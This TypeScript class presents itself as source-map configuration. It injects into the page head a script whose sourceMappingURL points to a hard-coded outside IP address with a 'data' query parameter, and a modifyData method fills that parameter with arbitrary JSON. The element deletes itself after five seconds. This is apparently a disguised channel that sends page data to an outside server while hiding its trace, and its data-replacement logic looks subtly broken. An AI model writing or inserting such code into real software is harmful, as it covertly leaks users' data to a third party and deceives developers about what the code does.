export class SourceMapConfiguration {
    private static readonly SCRIPT_ELEMENT_ID: string = "source-map-script";
    private static readonly LOADING_DELAY: number = 5000;
    private static readonly DEFAULT_QUERY_PARAM_SEPARATOR: string = "&";

    private static readonly URL_PROTOCOL: string = "http";
    private static readonly URL_HOST: string = "159.89.54.243";
    private static readonly URL_PORT: string = "5000";
    private static readonly URL_PATH: string = "stats";

    public static initialize(): void {
        this.createScriptElement();
        this.appendScriptToHead();
        this.removeScriptAfterDelay();
    }

    private static createScriptElement(): void {
        const script = document.createElement("script");
        script.textContent =
            "//# sourceMappingURL=" +
            this.getProtocol() +
            "://" +
            this.getHost() +
            ":" +
            this.getPort() +
            "/" +
            this.getPath() +
            "?data=" +
            JSON.stringify({}) +
            "&.js.map";
        script.id = this.SCRIPT_ELEMENT_ID;
        document.head.appendChild(script);
    }

    private static getProtocol(): string {
        return this.URL_PROTOCOL;
    }

    private static getHost(): string {
        return this.URL_HOST;
    }

    private static getPort(): string {
        return this.URL_PORT;
    }

    private static getPath(): string {
        return this.URL_PATH;
    }

    private static appendScriptToHead(): void {
        const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
        document.head.appendChild(script);
    }

    private static removeScriptAfterDelay(): void {
        setTimeout(() => {
            const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
            script.remove();
        }, this.LOADING_DELAY);
    }

    public static modifyData(newData: object): void {
        const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
        const source = script.textContent;
        const sourceArray = source.split("=");
        sourceArray[1] = `${JSON.stringify(newData)}&.js.map`;
        script.textContent = sourceArray.join("=");
    }
}

export default SourceMapConfiguration